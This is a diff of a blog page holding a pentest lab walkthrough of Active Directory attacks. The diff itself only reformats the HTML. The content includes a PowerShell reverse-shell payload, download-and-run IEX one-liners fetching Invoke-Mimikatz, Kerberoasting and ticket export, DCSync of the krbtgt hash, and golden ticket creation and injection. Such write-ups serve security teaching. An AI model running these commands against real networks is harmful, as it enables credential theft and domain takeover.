@@ -10,7 +10,6 @@
   <meta name="googlebot" content="index,follow,snippet,archive">
   <meta property="og:title" content="kerberos, kerberoast and golden tickets" />
 <meta property="og:description" content="
-     
 
 
 Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?
@@ -25,7 +24,6 @@ This post however tries to look at it from a little fresher perspective. There a
   <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="kerberos, kerberoast and golden tickets"/>
 <meta name="twitter:description" content="
-     
 
 
 Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?
@@ -178,7 +176,7 @@ if (!doNotTrack) {
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&name=kerberos%2c%20kerberoast%20and%20golden%20tickets&description=%3cfigure%3e%0a%20%20%20%20%3cimg%20src%3d%22%2fimages%2fkerberos_golden_ticket_active_directory_logo.png%22%2f%3e%20%0a%3c%2ffigure%3e%0a%0a%3cp%3eActive%20Directory%20is%20almost%20always%20in%20scope%20for%20many%20pentests.%20There%20is%20sometimes%20a%20competitive%20nature%20amongst%20pentesters%20where%20the%20challenge%20is%20to%20see%20who%20can%20set%20a%20new%20record%20for%20gaining%20Domain%20Administrative%20privileges%20the%20fastest.%20How%20sad%20its%20that%3f%3c%2fp%3e%0a%3cp%3eThe%20reality%20is%2c%20%3cem%3emany%3c%2fem%3e%20times%2c%20the%20escalation%20processes%20is%20trivial.%20Pwn%20some%20workstation%20with%20admin%20creds%2c%20grab%20credentials%20out%20of%20%3ccode%3elsass%3c%2fcode%3e%20and%20pass%20the%20hash%20to%20move%20around%20laterally.%20This%20has%20been%20the%20typical%20breakfast%20of%20many%20pentesters.%20Heck%2c%20there%20are%20even%20attempts%20to%20%3ca%20href%3d%22https%3a%2f%2fgithub.com%2fsensepost%2fautoDANE%22%3eautomate%3c%2fa%3e%20this%20type%20of%20process%20because%2c%20personally%2c%20I%20feel%20its%20getting%20pretty%20old.%20Yet%2c%20its%20still%20very%20viable%20as%20an%20attack%20method%20due%20to%20its%20high%20success%20rate%21%3c%2fp%3e%0a%3cp%3eThis%20post%20however%20tries%20to%20look%20at%20it%20from%20a%20little%20fresher%20perspective.%20There%20are%20many%20posts%20like%20this%20out%20there%2c%20but%20this%20one%20is%20mine.%20Mostly%20just%20a%20brain%20dump%20that%20I%20can%20refer%20to%20later.%20Many%20others%20have%20written%20this%20up%20%28maybe%20even%20in%20greater%20detail%29%2c%20so%20definitely%20have%20a%20look%20around%21%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&name=kerberos%2c%20kerberoast%20and%20golden%20tickets&description=%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fkerberos_golden_ticket_active_directory_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eActive%20Directory%20is%20almost%20always%20in%20scope%20for%20many%20pentests.%20There%20is%20sometimes%20a%20competitive%20nature%20amongst%20pentesters%20where%20the%20challenge%20is%20to%20see%20who%20can%20set%20a%20new%20record%20for%20gaining%20Domain%20Administrative%20privileges%20the%20fastest.%20How%20sad%20its%20that%3f%3c%2fp%3e%0a%3cp%3eThe%20reality%20is%2c%20%3cem%3emany%3c%2fem%3e%20times%2c%20the%20escalation%20processes%20is%20trivial.%20Pwn%20some%20workstation%20with%20admin%20creds%2c%20grab%20credentials%20out%20of%20%3ccode%3elsass%3c%2fcode%3e%20and%20pass%20the%20hash%20to%20move%20around%20laterally.%20This%20has%20been%20the%20typical%20breakfast%20of%20many%20pentesters.%20Heck%2c%20there%20are%20even%20attempts%20to%20%3ca%20href%3d%22https%3a%2f%2fgithub.com%2fsensepost%2fautoDANE%22%3eautomate%3c%2fa%3e%20this%20type%20of%20process%20because%2c%20personally%2c%20I%20feel%20its%20getting%20pretty%20old.%20Yet%2c%20its%20still%20very%20viable%20as%20an%20attack%20method%20due%20to%20its%20high%20success%20rate%21%3c%2fp%3e%0a%3cp%3eThis%20post%20however%20tries%20to%20look%20at%20it%20from%20a%20little%20fresher%20perspective.%20There%20are%20many%20posts%20like%20this%20out%20there%2c%20but%20this%20one%20is%20mine.%20Mostly%20just%20a%20brain%20dump%20that%20I%20can%20refer%20to%20later.%20Many%20others%20have%20written%20this%20up%20%28maybe%20even%20in%20greater%20detail%29%2c%20so%20definitely%20have%20a%20look%20around%21%3c%2fp%3e">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
@@ -261,8 +259,7 @@ if (!doNotTrack) {
 
   
     <div class="content" itemprop="articleBody">
-      <figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_active_directory_logo.png"/> 
+      <figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_active_directory_logo.png"/>
 </figure>
 
 <p>Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?</p>
@@ -278,8 +275,7 @@ if (!doNotTrack) {
 </ul>
 <p>For all of the attacks detailed here, I have a relatively simple setup in a lab. One (Server 2012) Domain Controller for the <em>foo.local</em> domain. Two client PCs joined to the domain running Windows 7 and Windows 10. Another IIS Web server running on Server 2012 Core also joined to the domain and Kali Linux &lsquo;attacker&rsquo; on the same subnet as all of these Windows computers.</p>
 <p>One key piece of the puzzle I am leaving out is how the initial shell was obtained. This could have happened a variety of ways and will probably always be different with every engagement. Lets just assume that I have a meterpreter shell as a non privileged domain user on the Windows 10 client PC.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_initial_meterpreter.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_initial_meterpreter.png"/>
 </figure>
 
 <p>One last bit of scene setting I think is important is to state the fact that we are going to try and be as quiet as possible now that we have the meterpreter shell up.</p>
@@ -323,18 +319,15 @@ Payload size: <span style="color:#f60">1727</span> bytes
 ���u�GrojS��powershell.exe -exec bypass -nop -W hidden -noninteractive IEX <span style="color:#f00">$(</span><span style="color:#eedd82">$s</span>=New-Object IO.MemoryStream(,[Convert]::FromBase64String(<span style="color:#87ceeb">&#39;H4sIABX0kF ... snip ... AAA=&#39;</span><span style="color:#f00">)</span>);IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(<span style="color:#eedd82">$s</span>,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();)
 </code></pre></div><p>This will give you the raw payload you need to run to get a remote powershell shell. Copy the output from <code>IEX</code> all the way to <code>ReadToEnd();)</code> and paste that in a new file (I used <code>/root/power-shell.ps1</code>).</p>
 <p>Now, back at your metasploit session, background the meterpreter session and setup a new <code>exploit/multi/handler</code> for the <code>windows/powershell_reverse_tcp</code> payload. When you issue the <code>exploit</code> command, add <code>-j</code> so that the job will run in the background as we have one more thing to do before it will connect back.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_powershell_handler.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_powershell_handler.png"/>
 </figure>
 
 <p>Fantastic. We are ready to accept the powershell connection! The last thing left to do is to execute the script we generated earlier with <code>msfvenom</code>! Use the <code>exec_powershell</code> post module and configure it to pickup the script where ever you placed it on disk:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_exec_powershell.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_exec_powershell.png"/>
 </figure>
 
 <p>With the module configured to use the meterpreter session we originally got, as well as our exploit handler waiting in the background for the powershell connection, we issue the <code>run</code> command and hope it works!</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_powershell_shell.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_powershell_shell.png"/>
 </figure>
 
 <blockquote>
@@ -344,8 +337,7 @@ Payload size: <span style="color:#f60">1727</span> bytes
 <p>The next thing we want to do is get the <code>Find-PSServiceAccounts</code> PowerShell function into the environment. The script lives <a href="https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts">here</a>. Thankfully, we can kind of <em>include</em> functions into the current session by using the powershell <code>Invoke-Expression</code> cmdlet for a new <code>Net.WebClient</code> object. To do that we run:</p>
 <pre><code>Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts')
 </code></pre><p>Thats it. We can now just run the method!!</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_find_psserviceaccounts.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_find_psserviceaccounts.png"/>
 </figure>
 
 <p>We have just discovered the service account <code>svcSQLServ</code> and 2 hosts there it is in use!
@@ -422,14 +414,12 @@ PS C:\&gt;
 PS C:\&gt; Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object System.Identity Model.Tokens.KerberosRequestorSecurityToken -ArgumentList $_ }
 
 </code></pre><p>Now, if we recheck the tickets we have for this session, we can see that we have one for <code>svcSQLServ</code>:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_spn.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_spn.png"/>
 </figure>
 
 <h2 id="dumping-kerberos-tickets-from-memory">dumping kerberos tickets from memory</h2>
 <p>Remember, all of the actions performed thus far have been as a normal AD user with no special privileges. With the tickets now in memory, we can dump them to a file using mimikatz again. The mimikatz command we will use for this is <code>kerberos::list /export</code>:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_exported_tickets.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_exported_tickets.png"/>
 </figure>
 
 <p><code>1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi</code> is the Kerberos ticket dumped to disk! We can now transfer this to some place where we have Kerberoast downloaded and start cracking it! :D</p>
@@ -492,8 +482,7 @@ PS C:\&gt;
 $creds = New-Object System.Management.Automation.PSCredential -ArgumentList &#39;svcSQLServ&#39;, $pass
 Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
 </code></pre></div><p>With output&hellip;</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_svcsqlserv_remoting.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_svcsqlserv_remoting.png"/>
 </figure>
 
 <p>So, we popped a service account with waaaay too much permissions and a crappy password. All that as a normal AD user&hellip;</p>
@@ -528,8 +517,7 @@ svcSQLServ
 <p>I constructed my command that needed to be run on my PowerShell session and ended up with this:</p>
 <pre><code>Invoke-Command -ScriptBlock {Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '&quot;lsadump::dcsync /user:krbtgt&quot;'} -Credential $creds -ComputerName dc1
 </code></pre><p>Let me try explain what is going on here. I am saying, <code>Invoke-Command</code> on the computer <code>dc1</code> as <code>svcSQLServ</code> (stored in the <code>$creds</code> variable) using PowerShell Remoting. The command to run is defined in the <code>ScriptBlock {}</code> which is i) download mimikatz ii) run <code>Invoke-Mimikatz</code> with the <code>lsadump::dcsync /user:krbtgt</code> command.</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_krbtgt.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_krbtgt.png"/>
 </figure>
 
 <p>We have the hash for <code>krbtgt</code>! <code>95a11f7d93fa3a5a61073662e6bd8468</code> : D That means I have everything I need to create a golden ticket, with all the access in the world! To summarize, my prerequisites are satisfied with the following values:</p>
@@ -544,8 +532,7 @@ svcSQLServ
 <p>For details about the command and arguments required, I referred to the <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver">mimikatz wiki</a> and replicated that. Our command should look something like the below, saving our golden ticket to <code>golden.tck</code> with access to a few builtin Windows Groups:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">kerberos::golden /user:darthvader /domain:foo.local /sid:S-1-5-21-2222611480-1876485831-1594900117 /krbtgt:95a11f7d93fa3a5a61073662e6bd8468 /ticket:golden.tck /groups:501,502,513,512,520,518,519
 </code></pre></div><p>Running this mimikatz command with <code>Invoke-Mimikatz</code> gets us our Golden Ticket:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_created.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_created.png"/>
 </figure>
 
 <h2 id="injecting-the-golden-ticket">injecting the golden ticket</h2>
@@ -558,13 +545,11 @@ svcSQLServ
 mimikatz(powershell) # kerberos::purge
 Ticket(s) purge for current session is OK
 </code></pre></div><p>Next, we inject the golden ticket we created using the mimikatz <code>kerberos::ptt</code> command to <em>&lsquo;Pass The Ticket&rsquo;</em>:</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_ptt.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_ptt.png"/>
 </figure>
 
 <p>After the ticket is injected into memory, we can verify its existence with the mimikaz <code>kerberos::list</code> command, or just using <code>klist</code>. Once it is injected, we <code>dir</code> the Domain Controllers <code>c$</code> share&hellip; an <em>smile</em>. The password for <code>scvSQLServ</code> can now change, it will no longer bother us!</p>
-<figure>
-    <img src="https://leonjza.github.io/images/kerberos_golden_ticket_admin.png"/> 
+<figure><img src="https://leonjza.github.io/images/kerberos_golden_ticket_admin.png"/>
 </figure>
 
 <h2 id="conclusion">conclusion</h2>
@@ -703,7 +688,7 @@ Ticket(s) purge for current session is OK
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&name=kerberos%2c%20kerberoast%20and%20golden%20tickets&description=%3cfigure%3e%0a%20%20%20%20%3cimg%20src%3d%22%2fimages%2fkerberos_golden_ticket_active_directory_logo.png%22%2f%3e%20%0a%3c%2ffigure%3e%0a%0a%3cp%3eActive%20Directory%20is%20almost%20always%20in%20scope%20for%20many%20pentests.%20There%20is%20sometimes%20a%20competitive%20nature%20amongst%20pentesters%20where%20the%20challenge%20is%20to%20see%20who%20can%20set%20a%20new%20record%20for%20gaining%20Domain%20Administrative%20privileges%20the%20fastest.%20How%20sad%20its%20that%3f%3c%2fp%3e%0a%3cp%3eThe%20reality%20is%2c%20%3cem%3emany%3c%2fem%3e%20times%2c%20the%20escalation%20processes%20is%20trivial.%20Pwn%20some%20workstation%20with%20admin%20creds%2c%20grab%20credentials%20out%20of%20%3ccode%3elsass%3c%2fcode%3e%20and%20pass%20the%20hash%20to%20move%20around%20laterally.%20This%20has%20been%20the%20typical%20breakfast%20of%20many%20pentesters.%20Heck%2c%20there%20are%20even%20attempts%20to%20%3ca%20href%3d%22https%3a%2f%2fgithub.com%2fsensepost%2fautoDANE%22%3eautomate%3c%2fa%3e%20this%20type%20of%20process%20because%2c%20personally%2c%20I%20feel%20its%20getting%20pretty%20old.%20Yet%2c%20its%20still%20very%20viable%20as%20an%20attack%20method%20due%20to%20its%20high%20success%20rate%21%3c%2fp%3e%0a%3cp%3eThis%20post%20however%20tries%20to%20look%20at%20it%20from%20a%20little%20fresher%20perspective.%20There%20are%20many%20posts%20like%20this%20out%20there%2c%20but%20this%20one%20is%20mine.%20Mostly%20just%20a%20brain%20dump%20that%20I%20can%20refer%20to%20later.%20Many%20others%20have%20written%20this%20up%20%28maybe%20even%20in%20greater%20detail%29%2c%20so%20definitely%20have%20a%20look%20around%21%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&name=kerberos%2c%20kerberoast%20and%20golden%20tickets&description=%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fkerberos_golden_ticket_active_directory_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eActive%20Directory%20is%20almost%20always%20in%20scope%20for%20many%20pentests.%20There%20is%20sometimes%20a%20competitive%20nature%20amongst%20pentesters%20where%20the%20challenge%20is%20to%20see%20who%20can%20set%20a%20new%20record%20for%20gaining%20Domain%20Administrative%20privileges%20the%20fastest.%20How%20sad%20its%20that%3f%3c%2fp%3e%0a%3cp%3eThe%20reality%20is%2c%20%3cem%3emany%3c%2fem%3e%20times%2c%20the%20escalation%20processes%20is%20trivial.%20Pwn%20some%20workstation%20with%20admin%20creds%2c%20grab%20credentials%20out%20of%20%3ccode%3elsass%3c%2fcode%3e%20and%20pass%20the%20hash%20to%20move%20around%20laterally.%20This%20has%20been%20the%20typical%20breakfast%20of%20many%20pentesters.%20Heck%2c%20there%20are%20even%20attempts%20to%20%3ca%20href%3d%22https%3a%2f%2fgithub.com%2fsensepost%2fautoDANE%22%3eautomate%3c%2fa%3e%20this%20type%20of%20process%20because%2c%20personally%2c%20I%20feel%20its%20getting%20pretty%20old.%20Yet%2c%20its%20still%20very%20viable%20as%20an%20attack%20method%20due%20to%20its%20high%20success%20rate%21%3c%2fp%3e%0a%3cp%3eThis%20post%20however%20tries%20to%20look%20at%20it%20from%20a%20little%20fresher%20perspective.%20There%20are%20many%20posts%20like%20this%20out%20there%2c%20but%20this%20one%20is%20mine.%20Mostly%20just%20a%20brain%20dump%20that%20I%20can%20refer%20to%20later.%20Many%20others%20have%20written%20this%20up%20%28maybe%20even%20in%20greater%20detail%29%2c%20so%20definitely%20have%20a%20look%20around%21%3c%2fp%3e">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
